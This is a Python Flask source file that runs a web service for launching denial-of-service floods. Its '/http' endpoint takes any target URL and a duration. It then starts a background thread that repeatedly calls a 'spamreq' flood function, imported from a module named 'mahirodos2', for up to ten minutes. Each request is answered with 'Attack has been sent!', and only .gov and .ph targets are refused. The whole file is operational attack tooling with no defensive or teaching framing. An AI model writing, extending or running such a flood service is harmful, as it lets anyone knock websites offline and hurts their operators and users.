from flask import Flask, request, jsonify
from mahirodos2 import spamreq
import re
import json
import time
import threading

app = Flask(__name__)
MAX_RUNTIME = 600  # Maximum runtime set to 10 minutes (10 * 60 seconds)
MAX_RUNTIME_FALLBACK = 300  # Fallback maximum runtime set to 5 minutes (5 * 60 seconds)

start_time = None

def run_spamreq(url, max_runtime):
    global start_time
    start_time = time.time()
    end_time = start_time + max_runtime

    while time.time() < end_time:
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)
        spamreq(url)

@app.route('/')
def home():
    return jsonify({"success": False, "message": "Invalid parameter!"}), 400

@app.route('/http')
def hi():
    global start_time
    if start_time is not None and time.time() - start_time >= MAX_RUNTIME:
        start_time = None
        return jsonify({"success": False, "message": "Spamreq time limit exceeded."}), 429

    url = request.args.get('url')
    time_param = request.args.get('time')

    if url is None or url == '':
        return jsonify({"success": False, "message": "Incomplete parameter query!"}), 400

    if not re.match(r'^(http:\/\/|https:\/\/|www\.)', url):
        return jsonify({"success": False, "message": "Enter a valid website URL starting with 'http://', 'https://', or 'www.'."}), 400

    if '.gov' in url or '.ph' in url:
        return jsonify({"success": False, "message": "Attacking .gov and .ph sites is not allowed."}), 403

    if time_param is None or not time_param.isdigit():
        max_runtime = MAX_RUNTIME_FALLBACK
        response_text = "Attack has been sent with maximum runtime set to 5 minutes (300 seconds) as the time parameter is missing or invalid."
    else:
        max_runtime = min(int(time_param), MAX_RUNTIME)
        response_text = "Attack has been sent!"

    thread = threading.Thread(target=run_spamreq, args=(url, max_runtime))
    thread.start()

    response_data = {"success": True, "message": response_text}
    return json.dumps(response_data), 200, {'Content-Type': 'application/json'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False)
